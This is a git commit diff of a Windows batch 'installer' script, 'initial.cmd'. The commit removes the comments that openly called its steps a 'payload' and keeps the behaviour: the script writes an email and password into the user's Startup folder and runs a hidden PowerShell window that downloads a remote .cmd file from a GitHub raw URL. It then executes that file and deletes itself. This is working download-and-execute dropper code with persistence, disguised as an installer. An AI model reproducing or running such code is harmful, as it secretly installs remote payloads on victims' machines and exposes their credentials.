54412052e862abcae9a176213824ce8ea3b5b45b
gozen-foto <gofoto.zen@proton.me>
2026-06-01 16:34:31 +0530

    Update initial.cmd

--- installer/initial.cmd
+++ installer/initial.cmd
@@ -1,24 +1,12 @@
 @echo off
-
-@REM credentials - CHANGE ME
 set "email=example@gmail.com"
 set "eword=key"
-
-@REM variables
 set "var=%cd%"
 set "startup=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-
-@REM move into startup directory
 cd %startup%
 echo %email% > email.txt
 echo %eword% > eword.txt
-
-@REM write payload to startup
-powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/wget.cmd -OutFile wget.cmd"
-
-@REM run payload
-powershell ./wget.cmd 
-
-@REM cd back into initial location
+powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/installer/goget.cmd -OutFile goget.cmd"
+powershell ./goget.cmd
 cd %var%
 del initial.cmd
